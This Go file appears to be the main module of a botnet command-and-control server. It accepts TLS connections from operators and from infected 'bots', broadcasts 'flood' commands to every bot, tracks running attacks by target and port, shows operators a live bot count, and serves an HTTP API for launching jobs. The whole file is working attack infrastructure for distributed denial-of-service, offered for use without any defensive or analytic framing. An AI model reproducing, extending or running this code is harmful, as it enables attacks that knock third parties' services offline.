package main

import (
	"crypto/tls"
	"fmt"
	"log"
	"net"
	"os"
	"os/signal"
	"sync"
	"syscall"
	"time"
)

var (
	swarm = newHive()
	cpool = newConnCache(maxPool)

	running = make(map[net.Conn]flood)
	runMu   sync.Mutex

	apiJobs = make(map[string]flood)
	apiMu   sync.RWMutex

	hist   []flood
	histMu sync.Mutex

	clients []*client
	cliMu   sync.RWMutex

	connSem   = make(chan struct{}, maxConns)
	workerSem = make(chan struct{}, 100)
)

func floodAll(c cmd) {
	raw := marshalCmd(c)
	w := newMsg(msgCmd, raw)
	enc, err := encodeMsg(w)
	if err != nil {
		return
	}
	all := swarm.Conns()
	for _, conn := range all {
		go func(cn net.Conn) {
			cn.SetWriteDeadline(time.Now().Add(5 * time.Second))
			cn.Write(enc)
		}(conn)
	}
}

func activeFloods() []flood {
	var out []flood
	runMu.Lock()
	for _, a := range running {
		if time.Now().Before(a.started.Add(a.dur)) {
			out = append(out, a)
		}
	}
	runMu.Unlock()
	apiMu.RLock()
	for _, a := range apiJobs {
		if time.Now().Before(a.started.Add(a.dur)) {
			out = append(out, a)
		}
	}
	apiMu.RUnlock()
	return out
}

func trackAPIFlood(a flood) {
	apiMu.Lock()
	apiJobs[a.target+":"+a.port] = a
	apiMu.Unlock()
	go func() {
		time.Sleep(a.dur)
		apiMu.Lock()
		delete(apiJobs, a.target+":"+a.port)
		apiMu.Unlock()
	}()
}

func titleLoop() {
	for {
		time.Sleep(10 * time.Second)
		cliMu.RLock()
		cnt := nodeCount()
		for _, uc := range clients {
			pushTitle(uc.conn, fmt.Sprintf("Bots: %d | User: %s", cnt, uc.user.Username))
		}
		cliMu.RUnlock()
	}
}

func serveClient(c *tls.Conn) {
	defer c.Close()
	ip := c.RemoteAddr().(*net.TCPAddr).IP.String()
	if !grabConn(ip) {
		c.Write([]byte("\033[0;31m[!] too many connections\033[0m\r\n"))
		return
	}
	defer freeConn(ip)

	ok, uc := loginFlow(c)
	if !ok || uc == nil {
		return
	}

	cliMu.Lock()
	clients = append(clients, uc)
	cliMu.Unlock()
	defer func() {
		cliMu.Lock()
		for i, u := range clients {
			if u == uc {
				clients = append(clients[:i], clients[i+1:]...)
				break
			}
		}
		cliMu.Unlock()
	}()

	userLog("INFO", uc.user.Username, "connected", ip, nil)
	commandLoop(c, uc)
	userLog("INFO", uc.user.Username, "disconnected", ip, nil)
}

func main() {
	initSessions()
	initLog(logDir)
	if err := loadPerms(); err != nil {
		log.Fatalf("acl: %v", err)
	}
	initRL()

	go titleLoop()
	go diagLoop()
	go pulseLoop()
	go sweepQuotas()
	go sweepLogins()
	go sweepConns()
	cpool.RunGC(30 * time.Second)

	cert, err := tls.LoadX509KeyPair(certPath, keyPath)
	if err != nil {
		log.Fatalf("cert: %v", err)
	}
	tc := &tls.Config{
		Certificates: []tls.Certificate{cert},
		MinVersion:   tls.VersionTLS13,
	}

	httpd = newHTTPAPI(addrAPI)
	go httpd.Serve()

	uln, err := tls.Listen("tcp", addrUser, tc)
	if err != nil {
		log.Fatalf("user listen: %v", err)
	}
	go func() {
		for {
			c, err := uln.Accept()
			if err != nil {
				continue
			}
			go serveClient(c.(*tls.Conn))
		}
	}()

	bln, err := tls.Listen("tcp", addrBot, tc)
	if err != nil {
		log.Fatalf("bot listen: %v", err)
	}
	go func() {
		for {
			c, err := bln.Accept()
			if err != nil {
				continue
			}
			go serveBot(c.(*tls.Conn))
		}
	}()

	log.Printf("cnc up | users=%s bots=%s api=%s", addrUser, addrBot, addrAPI)

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	<-sig

	log.Println("shutting down")
	uln.Close()
	bln.Close()
	cpool.Close()
}
